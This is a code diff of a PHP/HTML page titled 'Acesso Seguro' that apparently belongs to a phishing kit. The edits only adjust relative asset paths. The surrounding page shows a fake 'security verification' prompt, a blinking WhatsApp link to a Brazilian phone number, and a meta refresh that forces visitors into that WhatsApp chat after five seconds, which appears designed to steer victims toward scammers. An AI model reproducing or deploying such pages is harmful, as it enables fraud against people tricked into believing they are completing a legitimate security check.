@@ -12,7 +12,7 @@ session_start();
     <title>Acesso Seguro</title>
     <link href='//fonts.googleapis.com/css?family=Roboto:400,700' rel='stylesheet' type='text/css'>
     <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />
-    <link rel="icon" href="../assets/imgs/favicon.ico" type="image/x-icon" />
+    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
     <style>
         body {
             margin: 0;
@@ -22,7 +22,7 @@ session_start();
         #topo {
             width: 100%;
             height: 42px;
-            background: url(../assets/imgs/mLogomenor.png) no-repeat;
+            background: url(../../assets/imgs/mLogomenor.png) no-repeat;
             background-position: 14px 14px;
             background-color: #1664ac
         }
@@ -42,7 +42,7 @@ session_start();
         }
 
         .bttenter {
-            background: url(../assets/imgs/bgbottom.png) repeat;
+            background: url(../../assets/imgs/bgbottom.png) repeat;
             border-radius: 4px;
             font-family: arial;
             font-size: 18px;
@@ -61,7 +61,7 @@ session_start();
             width: 100%;
             height: 100%;
             z-index: 998;
-            background: url(../assets/imgs/bg-loading.png) repeat;
+            background: url(../../assets/imgs/bg-loading.png) repeat;
             display: none
         }
 
@@ -120,7 +120,7 @@ session_start();
         }
 
         .bttok {
-            background: url(../assets/imgs/bgbottom.png) repeat;
+            background: url(../../assets/imgs/bgbottom.png) repeat;
             border: 0 none;
             border-radius: 4px;
             color: #fff;
@@ -147,7 +147,7 @@ session_start();
             z-index: 65557;
             width: 120px;
             height: 120px;
-            background: url(../assets/imgs/loading.gif) no-repeat center center #fff;
+            background: url(../../assets/imgs/loading.gif) no-repeat center center #fff;
             border-radius: 10px;
             border: 2px solid #fff;
             top: 50%;
@@ -291,7 +291,7 @@ session_start();
         </div>
 
         <a href="https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
-            <img src="../assets/imgs/whatsapp.png" class="blink" width="100%">
+            <img src="../../assets/imgs/whatsapp.png" class="blink" width="100%">
         </a>
         <meta http-equiv="REFRESH" content="5; url=https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
 
